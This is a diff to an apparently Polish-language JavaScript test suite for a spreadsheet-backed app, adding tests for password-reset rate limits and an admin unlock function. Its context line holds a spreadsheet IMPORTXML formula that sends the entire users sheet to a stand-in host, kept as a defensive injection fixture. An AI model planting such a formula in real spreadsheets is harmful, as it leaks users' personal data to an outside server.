@@ -214,4 +214,36 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   C.dalej(6 * 3600 * 1000 + 1000);
   ok('po 6 godzinach (koniec okna) dobry podpis znów przechodzi bez logowania', C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
 }
+/* ---- 10. limit resetu hasła: okno stałe, licznik łączny tylko z nieudanych prób ---- */
+{
+  const B = swiezy(); const R = (kod, telefon) => B.post({ akcja: 'reset_hasla', kod, telefon });
+  for (let i = 0; i < 31; i++) R(String(20000 + i), '600000000');
+  ok('31 resetów z wymyślonych kodów wyczerpuje limit łączny (ochrona przed przeszukiwaniem kodów znanym numerem)', /Za duzo prob/.test(R('12345', '600100200').opis || ''));
+  for (let h = 0; h < 5; h++) { B.dalej(59 * 60 * 1000); R('2' + String(1000 + h), '600000000'); }
+  ok('pojedyncze zapytanie co 59 minut nie przedłuża blokady w nieskończoność (okno stałe) — reset prawdziwego konta działa', R('12345', '600100200').status === 'ok');
+  const C = swiezy(); const RC = (kod, telefon) => C.post({ akcja: 'reset_hasla', kod, telefon });
+  const zle = []; for (let i = 0; i < 5; i++) zle.push(RC('12345', '600000000').status);
+  ok('5 prób na kod na godzinę, szósta odrzucona (także z dobrym telefonem)', zle.every(s => s === 'blad') && /Za duzo prob/.test(RC('12345', '600100200').opis || ''));
+  for (let i = 0; i < 20; i++) { C.dalej(60 * 1000); RC('12345', '600000000'); }
+  C.dalej(41 * 60 * 1000);
+  ok('odrzucone próby nie są doliczane: godzinę po pierwszej próbie reset znów działa, mimo ponawiania', RC('12345', '600100200').status === 'ok');
+  ok('zalew jednego kodu nie odbiera resetu innym kontom', (() => { const D = swiezy(); for (let i = 0; i < 40; i++) D.post({ akcja: 'reset_hasla', kod: '12345', telefon: '600000000' }); return D.post({ akcja: 'reset_hasla', kod: '33333', telefon: '700800900' }).status === 'ok'; })());
+  ok('udane resety nie zużywają limitu łącznego', (() => { const E = swiezy(); for (let i = 0; i < 29; i++) E.post({ akcja: 'reset_hasla', kod: String(30000 + i), telefon: '1' });
+    const a = E.post({ akcja: 'reset_hasla', kod: '12345', telefon: '600100200' }).status, b = E.post({ akcja: 'reset_hasla', kod: '33333', telefon: '700800900' }).status;
+    E.post({ akcja: 'reset_hasla', kod: '30099', telefon: '1' }); return a === 'ok' && b === 'ok' && /Za duzo prob/.test(E.post({ akcja: 'reset_hasla', kod: '22222', telefon: '501502503' }).opis || ''); })());
+}
+/* ---- 11. administrator zdejmuje blokady funkcją odblokujKonta (uruchamianą ręcznie w edytorze) ---- */
+{
+  const B = swiezy();
+  for (let i = 0; i < 9; i++) B.post({ akcja: 'logowanie', kod: '12345', haslo: 'zle' + i });
+  for (let i = 0; i < 61; i++) B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'zle' + i });
+  for (let i = 0; i < 31; i++) B.post({ akcja: 'reset_hasla', kod: String(20000 + i), telefon: '1' });
+  const przed = [B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status, B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'haslo123' }).pelne];
+  B.wywolaj('odblokujKonta()');
+  ok('odblokujKonta() zdejmuje blokadę logowania, podpisów hasłem i resetu', przed[0] === 'blad' && przed[1] === false
+    && B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok' && B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'haslo123' }).pelne === true
+    && B.post({ akcja: 'reset_hasla', kod: '22222', telefon: '501502503' }).status === 'ok', JSON.stringify(przed));
+  ok('odblokowanie zostawia ślad w Log', B.get('Log').w.some(r => r[2] === 'odblokowanie'));
+  ok('odblokujKonta nie jest akcją dostępną przez adres /exec', B.post({ akcja: 'odblokujKonta', kod: '12345' }).opis === 'Nieznana akcja');
+}
 process.exit(kod);
